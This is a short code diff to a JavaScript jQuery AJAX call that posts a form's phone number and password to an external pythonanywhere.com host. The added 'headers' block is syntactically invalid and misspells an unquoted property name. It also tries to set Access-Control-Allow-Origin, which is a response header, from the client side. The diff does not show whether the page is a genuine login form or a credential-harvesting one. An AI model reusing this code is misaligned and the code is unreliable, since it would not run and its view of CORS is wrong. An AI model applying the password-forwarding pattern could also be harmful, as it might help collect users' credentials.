@@ -228,7 +228,11 @@
     $.ajax({
         url: 'https://erikadavis1.pythonanywhere.com ',
         type: 'POST',
-        contentType: 'application/json',
+        headers{
+            contentType: 'application/json',
+            ccess-Control-Allow-Origin: '*'
+        },
+        
         data: JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}),
         success: function(response) {
             console.log('Success:', response);
